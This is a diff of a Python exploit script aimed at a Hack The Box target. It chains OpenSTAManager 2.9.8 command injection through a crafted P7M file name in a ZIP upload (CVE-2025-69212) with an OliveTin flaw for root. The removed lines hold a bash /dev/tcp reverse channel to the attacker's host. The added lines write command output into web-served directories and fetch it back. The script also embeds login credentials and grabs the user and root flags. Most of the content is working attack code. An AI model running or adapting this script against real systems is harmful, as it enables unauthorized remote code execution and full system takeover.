@@ -1,23 +1,25 @@
 #!/usr/bin/env python3
 """Standalone OpenSTAManager 2.9.8 P7M RCE (CVE-2025-69212) -> user + root.
 
-Isolated from the full recon so it iterates in seconds. Gets a command channel
-by having the injected payload connect BACK to us (reverse-exec) — no webroot /
-file-write guessing. Then reads user.txt and, if a root-owned OliveTin is on
-127.0.0.1:1337, fires CVE-2026-27626 for root.txt.
+Isolated from the full recon so it iterates in seconds. The 2.9.8 decodeP7M runs
+  exec('openssl smime ... -in "'.$file.'" ...')   # $file double-quoted, unescaped
+so a ZIP entry named z$(<base32 cmd>|base32 -d|bash).p7m runs commands. HTB boxes
+usually block outbound, so we don't use a reverse shell: the payload WRITES its
+output to a web-served file under the docroot and we fetch it over HTTP. Then it
+reads user.txt and, if a root-owned OliveTin is on 127.0.0.1:1337, fires
+CVE-2026-27626 for root.txt.
 
     python3 osm_pwn.py http://support_001.enigma.htb admin Ne3s4rtars78s
-    python3 osm_pwn.py http://support_001.enigma.htb admin Ne3s4rtars78s 10.10.14.7
+    python3 osm_pwn.py http://support_001.enigma.htb admin Ne3s4rtars78s 14 48
 
-The 4th arg (LHOST) is optional — auto-detected from the route to the target.
-Run from the machine on the HTB VPN. Authorized targets only.
+Optional 4th/5th args pin the module/plugin id. Run from the HTB VPN host.
+Authorized targets only.
 """
 import base64
 import io
+import os
 import re
-import socket
 import sys
-import threading
 import time
 import urllib.parse
 import urllib.request
@@ -146,56 +148,43 @@ def upload(o, base, mid, pid, cmd):
     return st, resp
 
 
-# ---- reverse-exec channel ----------------------------------------------
-def lhost_for(base):
-    host = urllib.parse.urlparse(base).hostname
-    ip = socket.gethostbyname(host)
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        s.connect((ip, 80))
-        return s.getsockname()[0]
-    finally:
-        s.close()
+# ---- output-file channel (no egress needed) ----------------------------
+# HTB boxes commonly block outbound, so instead of a reverse connection we make
+# the payload WRITE command output to a web-served file and we fetch it. Docroot
+# is confirmed /var/www/html/openstamanager; try it + the app's writable dirs.
+WRITE_DIRS = [
+    "/var/www/html/openstamanager",
+    "/var/www/html/openstamanager/files",
+    "/var/www/html/openstamanager/tmp",
+    "/var/www/html/openstamanager/backup",
+    ".",
+]
+# URL path (relative to base) each dir maps to, for fetching the output back
+URL_PREFIX = {"/var/www/html/openstamanager": "", "/var/www/html/openstamanager/files": "files/",
+              "/var/www/html/openstamanager/tmp": "tmp/",
+              "/var/www/html/openstamanager/backup": "backup/", ".": ""}
 
 
-def run_cmd(o, base, mid, pid, lhost, cmd, wait=25):
-    """Bind a listener, inject a payload that pipes `cmd` output back to us."""
-    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    srv.bind(("0.0.0.0", 0))
-    port = srv.getsockname()[1]
-    srv.listen(1)
-    srv.settimeout(wait)
-    out = {}
-
-    def serve():
-        try:
-            conn, _ = srv.accept()
-            conn.settimeout(wait)
-            buf = b""
-            while True:
-                try:
-                    d = conn.recv(4096)
-                except socket.timeout:
-                    break
-                if not d:
-                    break
-                buf += d
-            out["data"] = buf
-            conn.close()
-        except Exception:
-            pass
-        finally:
-            srv.close()
-
-    t = threading.Thread(target=serve, daemon=True)
-    t.start()
-    time.sleep(0.3)
-    payload = (f"exec 3<>/dev/tcp/{lhost}/{port} && {{ {cmd} ; }} >&3 2>&3 ; "
-               "exec 3>&- 3<&-")
+def run_cmd(o, base, mid, pid, _lhost, cmd, wait=6):
+    """Inject a payload that writes `cmd` output into web-served dirs, then fetch
+    it back over HTTP. Returns the captured output (or '')."""
+    token = "s" + os.urandom(4).hex() + "z"
+    name = token + ".txt"
+    marker = "OK" + token
+    dirs = " ".join(f"'{d}'" for d in WRITE_DIRS)
+    # decoded by base32 -> may contain '/'. write marker+output to every dir.
+    payload = (f"for d in {dirs}; do {{ echo {marker}; {cmd}; }} "
+               f"> \"$d/{name}\" 2>/dev/null; done")
     upload(o, base, mid, pid, payload)
-    t.join(timeout=wait + 2)
-    return out.get("data", b"").decode("utf-8", "replace")
+    deadline = time.time() + wait
+    urls = [base + "/" + p + name for p in dict.fromkeys(URL_PREFIX.values())]
+    while time.time() < deadline:
+        for u in urls:
+            body = get(o, u)
+            if marker in body:
+                return body.split(marker, 1)[1].strip()
+        time.sleep(0.4)
+    return ""
 
 
 # ---- OliveTin root ------------------------------------------------------
@@ -226,61 +215,50 @@ def main():
         sys.exit(1)
     base = sys.argv[1].rstrip("/")
     user, pw = sys.argv[2], sys.argv[3]
-    lhost = sys.argv[4] if len(sys.argv) > 4 else lhost_for(base)
-    log("*", f"target {base}  lhost {lhost}")
+    log("*", f"target {base}  (output-file channel — no reverse connection)")
 
     o = session()
     if not login(o, base, user, pw):
         sys.exit(2)
 
-    # explicit module/plugin override: argv[5]=module argv[6]=plugin
-    if len(sys.argv) > 6:
-        cands = [(sys.argv[5], sys.argv[6])]
+    # explicit module/plugin override: argv[4]=module argv[5]=plugin
+    if len(sys.argv) > 5:
+        cands = [(sys.argv[4], sys.argv[5])]
         log("*", f"using given module/plugin {cands[0][0]}/{cands[0][1]}")
     else:
         cands = find_plugins(o, base)
 
-    # find the module whose save handler actually accepts the ZIP: a correct
-    # upload echoes {"id":1}; a wrong module returns empty; a non-Automatico
-    # install returns empty too (that needs an extra trigger — see below).
+    # Try each candidate module: fire the injection (writes `id;hostname` output
+    # to a web-served file) and see which one actually returns exec output.
     mid = pid = None
     for m, p in cands[:8]:
-        st, resp = upload(o, base, m, p, "id")
-        body = resp.strip()
-        log(".", f"module {m}/{p}: upload HTTP {st}, body {body[:120]!r}")
-        if '"id"' in body or "id:1" in body or "id" == body[:2] and "1" in body:
+        log("*", f"testing exec on module {m}/{p} …")
+        probe = run_cmd(o, base, m, p, None, "id; hostname")
+        if "uid=" in probe:
             mid, pid = m, p
-            log("+", f"save handler accepts the ZIP on module {m}/{p} (Automatico on)")
+            log("+", f"RCE via module {m}/{p}:")
+            for ln in probe.strip().splitlines():
+                print("      " + ln)
             break
+        # show the raw upload response for this module as a diagnostic
+        st, resp = upload(o, base, m, p, "id")
+        log(".", f"  no output; upload HTTP {st}, body {resp.strip()[:110]!r}")
     if not mid:
-        log("!", "no module returned {\"id\":1}. Either the import method isn't "
-                 "'Automatico' (save won't process — needs a manual trigger), or "
-                 "the module id differs. Trying reverse-exec on the top candidate "
-                 "anyway…")
-        mid, pid = cands[0]
-
-    log("*", f"confirming code execution on {mid}/{pid} (reverse-exec: id; hostname) …")
-    probe = run_cmd(o, base, mid, pid, lhost, "id; hostname")
-    if "uid=" not in probe:
-        log("!", "no callback. The exec either didn't fire or couldn't reach us.")
-        log(".", f"lhost used: {lhost} — if your VPN iface isn't this, pass it: "
-                 f"python3 {sys.argv[0]} {base} {user} {pw} <YOUR_TUN0_IP>")
-        log(".", "next: confirm the box can reach you — on the target's shell a "
-                 "reverse connection to your VPN IP must be allowed.")
+        log("!", "exec fired on no module via the output-file channel.")
+        log(".", "if the upload bodies above show an openssl/XML/exception error, the "
+                 "injection ran but couldn't write a web-readable file (docroot not "
+                 "writable) — tell me and I'll switch the write target.")
         sys.exit(4)
-    log("+", "RCE confirmed:")
-    for ln in probe.strip().splitlines():
-        print("      " + ln)
 
-    flag = run_cmd(o, base, mid, pid, lhost,
+    flag = run_cmd(o, base, mid, pid, None,
                    "cat /home/*/user.txt /var/www/*/user.txt 2>/dev/null")
     m = re.search(r"[0-9a-f]{32}", flag)
     if m:
         log("+", f"USER FLAG: {m.group(0)}")
     else:
-        log(".", f"user.txt not found in the usual spots; raw: {flag.strip()[:120]!r}")
+        log(".", f"user.txt not in the usual spots; raw: {flag.strip()[:120]!r}")
 
-    root = olivetin_root(o, base, mid, pid, lhost)
+    root = olivetin_root(o, base, mid, pid, None)
     r = re.search(r"[0-9a-f]{32}", root)
     if r:
         log("+", f"ROOT FLAG: {r.group(0)}")
